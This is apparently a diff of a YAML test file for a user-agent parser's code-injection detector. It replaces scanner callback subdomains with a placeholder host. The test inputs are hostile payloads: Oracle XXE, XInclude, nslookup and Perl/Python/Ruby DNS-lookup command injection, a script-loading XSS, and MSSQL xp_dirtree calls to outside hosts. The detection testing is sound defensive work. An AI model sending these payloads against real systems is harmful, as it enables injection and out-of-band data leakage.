@@ -135,7 +135,7 @@ config:
 
 - test:
     input:
-      user_agent_string: '"(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % izjvh SYSTEM \""http://u61vg2dwm0t6imbnq61n556eh5nygq4tsofe33.burpcollab''||''orator.net/\"">%izjvh;]>''),''/l'') from dual)"'
+      user_agent_string: '"(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % izjvh SYSTEM \""http://1xx2hack3host4xx5.burpcollab''||''orator.net/\"">%izjvh;]>''),''/l'') from dual)"'
     expected: *isCodeInjection
 
 - test:
@@ -580,17 +580,17 @@ config:
 
 - test:
     input:
-      user_agent_string: '"\""+\""A\"".concat(70-3).concat(22*4).concat(103).concat(76).concat(97).concat(68)+(require\""socket\"" Socket.gethostbyname(\""hitep\""+\""dyxcykvwed7ef.bxss.me.\"")[3].to_s)+\"""'
+      user_agent_string: '"\""+\""A\"".concat(70-3).concat(22*4).concat(103).concat(76).concat(97).concat(68)+(require\""socket\"" Socket.gethostbyname(\""hitep\""+\""1xx2hack3host4xx5.bxss.me.\"")[3].to_s)+\"""'
     expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: '"<bgy xmlns=\""http://a.b/\"" xmlns:xsi=\""http://www.w3.org/2001/XMLSchema-instance\"" xsi:schemaLocation=\""http://a.b/ http://cuayv6m2teif2iswzoxilzq9r0xulk9kxbnydm2.burpcollaborator.net/bgy.xsd\"">bgy</bgy>"'
+      user_agent_string: '"<bgy xmlns=\""http://a.b/\"" xmlns:xsi=\""http://www.w3.org/2001/XMLSchema-instance\"" xsi:schemaLocation=\""http://a.b/ http://1xx2hack3host4xx5.burpcollaborator.net/bgy.xsd\"">bgy</bgy>"'
     expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: '"<bnj xmlns:xi=\""http://www.w3.org/2001/XInclude\""><xi:include href=\""http://qrlcskjgqsftzwpaw2uwidnnoeu8i162utkga4z.burpcollaborator.net/foo\""/></bnj>"'
+      user_agent_string: '"<bnj xmlns:xi=\""http://www.w3.org/2001/XInclude\""><xi:include href=\""http://1xx2hack3host4xx5.burpcollaborator.net/foo\""/></bnj>"'
     expected: *isCodeInjection
 
 - test:
@@ -615,7 +615,7 @@ config:
 
 - test:
     input:
-      user_agent_string: '"\"".gethostbyname(lc(\""hitbs\"".\""vizfkxhu5d44c.bxss.me.\"")).\""A\"".chr(67).chr(hex(\""58\"")).chr(105).chr(73).chr(109).chr(75).\"""'
+      user_agent_string: '"\"".gethostbyname(lc(\""hitbs\"".\""1xx2hack3host4xx5.bxss.me.\"")).\""A\"".chr(67).chr(hex(\""58\"")).chr(105).chr(73).chr(109).chr(75).\"""'
     expected: *isCodeInjection
 
 - test:
@@ -630,7 +630,7 @@ config:
 
 - test:
     input:
-      user_agent_string: '"javascript:/*</script><svg/onload=''+/\""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\\/0qrnlxud6i5funux3wy1o3lhs8yztnle99wzko\\.burpcollaborator.net/).replace(/\\\\/g,[]))//''>"'
+      user_agent_string: '"javascript:/*</script><svg/onload=''+/\""/+/onmouseover=1/+/[*/[]/+((new(Image)).src=([]+/\\/1xx2hack3host4xx5\\.burpcollaborator.net/).replace(/\\\\/g,[]))//''>"'
     expected: *isCodeInjection
 
 - test:
@@ -640,7 +640,7 @@ config:
 
 - test:
     input:
-      user_agent_string: '"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)''||(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % vymwj SYSTEM \""http://222pxz6fikhh6p6zfya305xj4aa2fqjee14pt.burpcollab''||''orator.net/\"">%vymwj;]>''),''/l'') from dual)||''"'
+      user_agent_string: '"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)''||(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % vymwj SYSTEM \""http://1xx2hack3host4xx5.burpcollab''||''orator.net/\"">%vymwj;]>''),''/l'') from dual)||''"'
     expected: *isCodeInjection
 
 - test:
@@ -650,12 +650,12 @@ config:
 
 - test:
     input:
-      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36''>\""></title></style></textarea></noscript></template></script><script/src=\""//bxss.me/s?u=009365&r=108649-274&h=108649-099e0-2&\""></script>"'
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.103 Safari/537.36''>\""></title></style></textarea></noscript></template></script><script/src=\""//bxss.me/s?u=12345&r=12345-123&h=12345-099e0-2&\""></script>"'
     expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36''\""`0&nslookup -q=cname 2y18pv3tppwogeka3w8m5jqej5pydp5qtnhi48sx.burpcollaborator.net.&`''"'
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36''\""`0&nslookup -q=cname 1xx2hack3host4xx5.burpcollaborator.net.&`''"'
     expected: *isCodeInjection
 
 - test:
@@ -665,22 +665,22 @@ config:
 
 - test:
     input:
-      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36''||(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % hozmx SYSTEM \""http://1pr7guusgonn7db9uvzlwihda4gx4o6ruviq5gt5.burpcollab''||''orator.net/\"">%hozmx;]>''),''/l'') from dual)||''"'
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36''||(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % hozmx SYSTEM \""http://1xx2hack3host4xx5.burpcollab''||''orator.net/\"">%hozmx;]>''),''/l'') from dual)||''"'
     expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: '"<xxp xmlns:xi=\""http://www.w3.org/2001/XInclude\""><xi:include href=\""http://vyxhzpqlxxmy61wf3711piusvj1dp3d41vrih66.burpcollaborator.net/foo\""/></xxp>"'
+      user_agent_string: '"<xxp xmlns:xi=\""http://www.w3.org/2001/XInclude\""><xi:include href=\""http://1xx2hack3host4xx5.burpcollaborator.net/foo\""/></xxp>"'
     expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: '"\""+str(__import__(''time'').sleep(9))+__import__(''socket'').gethostbyname(''hitafkttfczcr2a1fa.''+''bxss.me'')+\"""'
+      user_agent_string: '"\""+str(__import__(''time'').sleep(9))+__import__(''socket'').gethostbyname(''1xx2hack3host4xx5.''+''bxss.me'')+\"""'
     expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: '"(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % ocyrx SYSTEM \""http://dubjl6z4l0szcpglz74x1umpfgl9966u9i45utj.burpcollab''||''orator.net/\"">%ocyrx;]>''),''/l'') from dual)"'
+      user_agent_string: '"(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % ocyrx SYSTEM \""http://1xx2hack3host4xx5.burpcollab''||''orator.net/\"">%ocyrx;]>''),''/l'') from dual)"'
     expected: *isCodeInjection
 
 - test:
@@ -706,7 +706,7 @@ config:
 
 - test:
     input:
-      user_agent_string: 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'';declare @q varchar(99);set @q=''\\\\0861x6oxcszin7.burpcollab''+''orator.net\\gay''; exec master.dbo.xp_dirtree @q;--'
+      user_agent_string: 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'';declare @q varchar(99);set @q=''\\\\1xx2hack3host4xx5.burpcollab''+''orator.net\\gay''; exec master.dbo.xp_dirtree @q;--'
     expected: *isCodeInjection
 
 # This used to trigger an NPE
@@ -743,27 +743,27 @@ config:
 
 - test:
     input:
-      user_agent_string: '"|(nslookup hitsjwnojvvmi77ddb.bxss.me||perl -e \""gethostbyname(''hitsjwnojvvmi77ddb.bxss.me'')\"")"'
+      user_agent_string: '"|(nslookup hitsjwnojvvmi77ddb.bxss.me||perl -e \""gethostbyname(''1xx2hack3host4xx5.bxss.me'')\"")"'
     expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: '"`(nslookup hitswcpzhzszb9eda1.bxss.me||perl -e \""gethostbyname(''hitswcpzhzszb9eda1.bxss.me'')\"")`"'
+      user_agent_string: '"`(nslookup hitswcpzhzszb9eda1.bxss.me||perl -e \""gethostbyname(''1xx2hack3host4xx5.bxss.me'')\"")`"'
     expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: '";(nslookup hittaenbwoeyd306d8.bxss.me||perl -e \""gethostbyname(''hittaenbwoeyd306d8.bxss.me'')\"")|(nslookup hittaenbwoeyd306d8.bxss.me||perl -e \""gethostbyname(''hittaenbwoeyd306d8.bxss.me'')\"")&(nslookup hittaenbwoeyd306d8.bxss.me||perl -e \""gethostbyname(''hittaenbwoeyd306d8.bxss.me'')\"")"'
+      user_agent_string: '";(nslookup 1xx2hack3host4xx5.bxss.me||perl -e \""gethostbyname(''1xx2hack3host4xx5.bxss.me'')\"")|(nslookup 1xx2hack3host4xx5.bxss.me||perl -e \""gethostbyname(''1xx2hack3host4xx5.bxss.me'')\"")&(nslookup 1xx2hack3host4xx5.bxss.me||perl -e \""gethostbyname(''1xx2hack3host4xx5.bxss.me'')\"")"'
     expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: '"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21''>\""></title></style></textarea></noscript></template></script><script/src=\""//bxss.me/s?u=009365&r=103314-15472&h=103314-57586-2&\""></script>"'
+      user_agent_string: '"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21''>\""></title></style></textarea></noscript></template></script><script/src=\""//bxss.me/s?u=12345&r=12345-12345&h=12345-12345-2&\""></script>"'
     expected: *isCodeInjection
 
 - test:
     input:
-      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0''||(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % aiinc SYSTEM \""http://vtscnxwmimnw54xv5i6172v7gymral99dx8ky8n.burpcollab''||''orator.net/\"">%aiinc;]>''),''/l'') from dual)||''"'
+      user_agent_string: '"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0''||(select extractvalue(xmltype(''<?xml version=\""1.0\"" encoding=\""UTF-8\""?><!DOCTYPE root [ <!ENTITY % aiinc SYSTEM \""http://1xx2hack3host4xx5.burpcollab''||''orator.net/\"">%aiinc;]>''),''/l'') from dual)||''"'
     expected: *isCodeInjection
 
 - test:
